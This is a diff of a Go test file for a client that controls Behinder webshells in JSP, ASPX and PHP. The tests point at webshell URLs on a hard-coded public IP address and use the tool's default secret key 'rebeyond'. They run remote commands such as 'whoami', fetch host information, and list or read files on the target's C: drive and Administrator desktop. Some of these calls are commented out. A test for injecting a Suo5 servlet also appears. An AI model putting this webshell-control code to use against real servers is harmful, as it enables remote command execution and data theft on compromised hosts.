@@ -51,21 +51,32 @@ func TestNewWebJSPShell(t *testing.T) {
 	//	return
 	//}
 	//t.Logf("%v", ping)
-	dir, err := bx.listFile("C:\\")
-	//ping, err := bx.showFile("C:\\Vuln\\apache-tomcat-8.5.84\\webapps\\S2-032")
-	if err != nil {
-		t.Error(err)
-		return
-	}
-	t.Logf("%s", string(dir))
 
-	x, err := bx.showFile("C:\\Users\\Administrator\\Desktop\\1.txt")
+	info, _ := bx.BasicInfo()
+	t.Logf("%v", string(info))
 
-	if err != nil {
-		t.Error(err)
-		return
-	}
-	t.Logf("%s", string(x))
+	//cmd, err := bx.CommandExec("whoami")
+	//if err != nil {
+	//	t.Error(err)
+	//	return
+	//}
+	//t.Logf("%s", string(cmd))
+
+	//dir, err := bx.listFile("C:\\")
+	////ping, err := bx.showFile("C:\\Vuln\\apache-tomcat-8.5.84\\webapps\\S2-032")
+	//if err != nil {
+	//	t.Error(err)
+	//	return
+	//}
+	//t.Logf("%s", string(dir))
+	//
+	//x, err := bx.showFile("C:\\Users\\Administrator\\Desktop\\1.txt")
+	//
+	//if err != nil {
+	//	t.Error(err)
+	//	return
+	//}
+	//t.Logf("%s", string(x))
 }
 
 func TestNewWebJSPShell_B3(t *testing.T) {
@@ -87,6 +98,8 @@ func TestNewWebJSPShell_B3(t *testing.T) {
 		return
 	}
 	t.Logf("%v", ping)
+	info, _ := bx.BasicInfo()
+	t.Logf("%v", string(info))
 }
 
 func TestNewWebASPXShell(t *testing.T) {
@@ -126,7 +139,6 @@ func TestNewWebASPXShell(t *testing.T) {
 func TestNewWebPHPShell(t *testing.T) {
 
 	url := "http://47.120.44.219/bx4-bs64.php"
-
 	bx, _ := NewBehinderManager(url,
 		SetSecretKey("rebeyond"),
 		SetShellScript("php"),
@@ -155,13 +167,38 @@ function encrypt($data){
 		}
 		return decodedData, nil
 	})
-	ping, err := bx.Ping()
+	//ping, err := bx.Ping()
+	////ping, err := bx.listFile("C:/")
+	//if err != nil {
+	//	t.Error(err)
+	//	return
+	//}
+	//t.Logf("%v", (ping))
+	cmd, err := bx.CommandExec("whoami")
 	//ping, err := bx.listFile("C:/")
 	if err != nil {
 		t.Error(err)
 		return
 	}
-	t.Logf("%v", (ping))
+	t.Logf("%v", string(cmd))
+}
+
+func TestNewWebPHPShell_B3(t *testing.T) {
+
+	url := "http://47.120.44.219/bx3.php"
+	bx, _ := NewBehinderManager(url,
+		SetSecretKey("rebeyond"),
+		SetShellScript("php"),
+		SetProxy("http://127.0.0.1:9999"),
+	)
+
+	cmd, err := bx.CommandExec("whoami")
+	//ping, err := bx.listFile("C:/")
+	if err != nil {
+		t.Error(err)
+		return
+	}
+	t.Logf("%v", string(cmd))
 }
 
 func TestInjectSuo5Servlet(t *testing.T) {
